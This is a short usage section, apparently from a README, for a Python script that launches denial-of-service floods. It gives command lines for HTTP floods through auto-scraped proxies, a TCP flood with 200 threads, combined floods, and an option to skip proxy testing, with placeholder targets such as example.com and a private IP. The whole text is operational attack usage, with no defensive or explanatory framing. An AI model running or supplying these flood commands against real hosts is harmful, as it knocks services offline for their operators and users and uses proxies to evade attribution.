# Auto-scrape proxies and use them for HTTP flood
python3 script.py http://example.com --protocol http --proxies -t 50 -d 60

# TCP flood with 200 threads for 30 seconds
sudo python3 script.py 192.168.1.1 -p 80 -t 200 -d 30

# All protocols with proxies for HTTP
sudo python3 script.py example.com -p 80 -t 100 -d 120 --proxies

# Skip proxy testing for faster startup
python3 script.py http://example.com --protocol http --proxies --no-test -t 30
